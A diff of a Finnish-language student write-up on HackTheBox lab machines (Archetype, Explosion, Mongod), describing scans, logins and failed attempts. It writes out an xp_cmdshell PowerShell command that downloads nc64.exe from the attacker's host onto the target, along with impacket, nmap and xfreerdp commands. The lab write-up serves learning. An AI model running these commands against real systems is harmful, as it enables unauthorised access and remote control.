@@ -293,7 +293,7 @@ Katsoin ohjeesta komentoa ja totesin ohjeen olevan melko sekava.
 ![kuva](https://github.com/user-attachments/assets/9497cc94-235d-4a17-a84f-fe1a6b9bd90c)
 
 Katsoin esimerkin ohjeesta ja sain komennoksi
-'impacket-mssqlclient.py ARCHETYPE/sql_svc@10.129.145.0 -windows-auth'
+'impacket-mssqlclient ARCHETYPE/sql_svc@10.129.145.0 -windows-auth'
 - ARCHETYPE/sql_svc on käyttäjä
 - 10.129.145.0 on kohteen osoite
 - -windows-auth laittaa windowsin oman tunnistuksen päälle
@@ -335,62 +335,80 @@ Tehtävää aloittaessani totesin, että kohdekoneen IP on uusiutunut. Koetin si
 
 Kone oli nollaantunut, sallin siis tämän uudelleen ja toimin aiemmin raportissa tekemieni ohjeiden mukaisesti, toki kohdekoneen IP-osoitteen muuttaen.
 
+![kuva](https://github.com/user-attachments/assets/dd2c940e-19dc-4268-916f-d6f712d35134)
+
+Sain komentoni takaisin.
+
+Avasin ohjeen mukaiset ohjelmat isäntäkoneeseen ja yritin ladata tiedostoa uudelleen.
+
+Kokosin komennon 'xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.14.233/nc64.exe -outfile nc64.exe"'
+
+Komentoa ajaessani unohdin lopun heittomerkit ja sain sillä ilmeisesti koneen kaadettua. Opinpahan tämänkin.
+
+Kone nollaantui sen uudelleen käynnistämisenyhteydessä, joten tein äskeiset askeleet uudelleen. Päivityksenä, että oletettavasti kone ei kaatunutkaan, vaan käytin väärää IP-osoitetta siihen yhdistämisessä. Väärin kirjoitettu komento kuitenkin lukitsi komentorivin, enkä pystynyt siinä yhteydessä jatkamaan.
+
+![kuva](https://github.com/user-attachments/assets/5fb696d6-5b18-4112-a18d-a0e2e975e678)
+
+GET pyyntö näkyy taas.
+
+Kone katosi kolmannen kerran. En ymmärrä. En keksi virhettäni. SQL tuntuu kaatuvan aina samassa komennossa, vaikka se saa vastauksen palvelimeltani. Portit 80 ja 443 ovat kuuntelussa. Luin käyttämäni komennon läpi, mutten löytänyt siitä virhettä. En keksinyt tapaa korjata tilannetta, enkä halunnut tuhlata enempää aikaa tähän. Vaihdoin toiseen koneeseen ja päätin katsoa videoratkaisun tähän myöhemmin, jotta näen periaatteen miten olisin jatkanut jos lataus olisi toiminut.
+
+## Explosion
+
+Uusi kone uusi yritys.
+
+![kuva](https://github.com/user-attachments/assets/7710f4bb-6edd-42dd-a46c-a1e5a9e4af3e)
+
+Yhteys toimi oikein.
+
+RDP tarkoitti Wikipedian mukaan Remote Desktop Protocol, eli työpöydän Microsoftin oma etäohjaus työkalu.
+
+Etenin kysymyksissä, kunnes tuli aika skannata. En avannut turhaan msfconsolea vaan ajoin suoraan komennon 'sudo nmap -A -p- 10.129.43.244'
+
+Skannauksesta selvisi, että terminaalipalvelin on auki portissa 3389.
+
+![kuva](https://github.com/user-attachments/assets/f2acd50b-a45a-492f-8a36-9059067fca07)
 
 
+Skannauksen aikana tutkin mitä seuraavaksi tehdään. Hyökkäyksessä käytetään ohjelmaa xfreerdp. TÄmä ohjelma luo etäyhteyden käyttäen telnet yhteyttä. Ajoin komennon 'xfreerdp /v: 10.129.43.244'
+
+Tämä aiheutti error viestin, sillä en ollut määrittänyt käyttäjää. Ohjetta seuraten määritin käyttäjän ja ohjeistin ohittamaan kaikki sertifikaattiin liittyvät tarkistukset komennolla 'xfreerdp /v:10.129.43.244 /cert:ignore /u:Administrator'
+
+![kuva](https://github.com/user-attachments/assets/27bc5712-7d3f-4dde-866b-bb46fd4720f3)
+
+Sain avattua etäyhteyden. Ikkuna kuitenkin sulkeui ja yhteys katkesi aina kun yritin liittyä koneeseen. Ilmeisesti tämä on yleinen ongelma HTB palveluissa, missä tulee maksimi määrä käyttäjiä vastaan ja palvelu ei enää yksinkertaisesti toimi. Tämä oli viimeinen askel ennen lipun saamista. Laskin kuitenkin tehtävän onnistuneeksi, koska ongelma ei ole itselläni. En kuitenkaan halua hyökätä tässä harjoituksessa enää Windows koneisiin.
+
+## Mongod
+
+Viimeisenä päätin vielä ratkaista Mongod koneen Starting pointista.
+
+Avasin koneen ja skannasin sen portit.
+
+![kuva](https://github.com/user-attachments/assets/2fc01885-e7cf-4d7c-8e0d-b81ddae5237a)
 
 
+Kohteessa oli kaksi porttia auki, ssh ja mongodb.
+
+Ohjeen mukaan yritin kirjautua tietokantaan komennolla 'mongosh mongodb://10.129.228.30:27017' Tässä IP-osoite muutettu, mongosh kutsuu mongon shelliä ja mongodb määrittääkohdeosoitteen ja portin.
 
 
+![kuva](https://github.com/user-attachments/assets/5a057e9e-8764-49e9-ba6c-f4633f794ff6)
 
+Tämäkään ei suostunut yhdistämään. Huomasin, ettei VPN ollut päällä.
 
+Yritin komentoa uudelleen ja tällä kertaa se jäi paikalleen.
 
+![kuva](https://github.com/user-attachments/assets/8d9d4297-b3d6-455a-9a03-52ad30dad76f)
 
+Odotin 15 minuuttia ja mitään ei tapahtunut. En jaksanut odottaa enempää. En ollut järin innoissani tämän palvelun toimivuudesta ja olin tuhlannut suuren määrän tunteja vain saadakseni jotain toimimaan. En saanut yhteyttä tietokantaan, joten en pystynyt etenemään. Antiklimaattinen loppu.
 
+# Lähteet:
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+1. T. Karvinen, 2023, Find Hidden Web Directories - Fuzz URLs with ffuf, https://terokarvinen.com/2023/fuzz-urls-find-hidden-directories/, luettu 12.11.2024
+2. OpenWall, Re: CVE request: UnrealIRCd 3.2.8.1, https://www.openwall.com/lists/oss-security/2010/06/14/11, luettu 12.11.2024
+3. 'man iptables' luettu 12.11.2024
+4. ChatGPT, Prompt:"using linux kali and iptables how do I accept outbound networking only to network 10.10.10.0/24" luettu 10.11.2024
+5. HackTheBox ohjeet Archetype, Mongod ja Explosion, luettu 12.11.2024 ja 13.11.2024
 
 
 
